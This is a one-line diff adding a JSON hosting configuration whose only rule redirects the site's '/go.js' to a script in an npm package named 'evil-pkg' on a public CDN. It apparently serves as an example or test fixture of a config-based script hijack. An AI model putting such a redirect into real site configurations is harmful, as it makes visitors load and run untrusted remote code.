@@ -1,0 +1,1 @@
+{"hosting": {"redirects": [{"source": "/go.js", "destination": "https://cdn.jsdelivr.net/npm/evil-pkg@1.0.0/x.js", "type": 302}]}}
